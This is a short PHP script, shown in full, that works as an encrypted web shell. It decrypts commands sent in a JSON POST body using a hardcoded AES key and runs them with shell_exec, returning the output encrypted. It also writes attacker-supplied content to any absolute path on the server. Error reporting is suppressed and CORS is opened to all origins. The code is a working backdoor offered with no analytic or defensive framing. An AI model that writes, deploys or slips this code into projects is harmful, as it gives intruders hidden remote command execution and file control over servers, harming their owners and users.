<?php 
error_reporting(0);

$key = hex2bin('780ffdcd9107448627a765e5f1a46c32');
$iv =  hex2bin('9911da82e6816dcd46acfe4c11c32f5d');

function encrypt($plaintext)
{
    global $key, $iv;
    return base64_encode(openssl_encrypt($plaintext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv));
}

function decrypt($ciphertext)
{
    global $key, $iv;
    return openssl_decrypt(base64_decode($ciphertext), 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
}

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: *');
header('Content-Type: application/json');

$data = json_decode(file_get_contents('php://input'), true);

if (isset($data['encryptedCommand'])) {
    $cmd = decrypt($data['encryptedCommand']);
    $output = shell_exec($cmd);
    $res = encrypt($output ?: "No output.");
    echo json_encode(['msg' => $res]);
    exit;
}

if (isset($data['encryptedFileName']) && isset($data['encryptedData'])) {
    $decryptedPath = decrypt($data['encryptedFileName']);
    $decryptedContent = decrypt($data['encryptedData']);

    $isWindowsPath = preg_match('/^[a-zA-Z]:\\\\/', $decryptedPath);
    $isUnixPath = preg_match('/^\//', $decryptedPath);

    $absolutePath = $isWindowsPath || $isUnixPath;


    if (!$absolutePath) {
        $decryptedPath = 'uploads/' . basename($decryptedPath);
    }

    $writeResult = file_put_contents($decryptedPath, $decryptedContent);

    if ($writeResult === false) {
        echo json_encode(['msg' => encrypt("File upload failed. Please try again.")]);
    } else {
        $responseMessage = $absolutePath 
            ? "File uploaded successfully!" 
            : $decryptedPath;
        echo json_encode(['msg' => encrypt($responseMessage)]);
    }

    exit;
}
?>